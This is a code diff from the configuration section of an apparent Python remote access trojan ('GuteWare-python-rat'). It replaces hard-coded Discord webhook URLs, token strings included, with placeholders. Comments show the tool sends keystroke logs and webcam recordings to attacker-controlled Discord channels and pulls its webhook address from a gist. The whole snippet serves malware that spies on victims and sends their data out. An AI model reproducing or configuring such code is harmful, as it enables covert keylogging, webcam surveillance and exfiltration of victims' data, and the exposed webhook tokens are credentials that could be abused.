@@ -131,20 +131,20 @@ link = "https://github.com/dacianfan/GuteWare-python-rat"
 # editing anything else may break something.
 
 data = requests.get(
-    'https://gist.github.com/dacianfan/71345092bc4c68010ec4b5c034c2d72d/raw')
+    'your gist here')
 for line in data:
     linedecoded = line.decode()
-    webhook = Webhook("https://discord.com/api/webhooks/999066463463809074/maBlPRJAS-K9Ya8rjCYEYAg19V5rVhdo39ZNSAej1KymuKo-l62cY4Rm01I9_jPqR8ra")
+    webhook = Webhook(linedecoded)
 
 # SET A NEW WEBHOOK FOR YOUR KEY LOGGER
 # (I'd make it in a new channel because it kinda floods the channel)
-keyloghook = "https://discord.com/api/webhooks/1003754378894782574/BzQ_P_pgqsLo6CuqcalKBBdiF3BIpSU6SPcKEKozzGYPlHGP4fr5U-HZWasxmJ79ne60"
+keyloghook = "your webhook here"
 ReportDelay = 60 # time between reports (seconds)
 
 # Set your webhook for webcam recording
 # (I'd make it in a new channel because it kinda floods the channel)
     
-camhook = Webhook("https://discord.com/api/webhooks/1003760040013996092/Nprl9Zo0ba3fduBLt08CLDK1fb1L74pAQVkMu8HEwAhB6PQ4y45PKD4VcFpb5_huIuw4")
+camhook = Webhook("your webhook here")
 
 # Select an embed colour
 # Options: red, blue, green, purple, yellow, white, black, grey, orange, pink, teal, brown, maroon
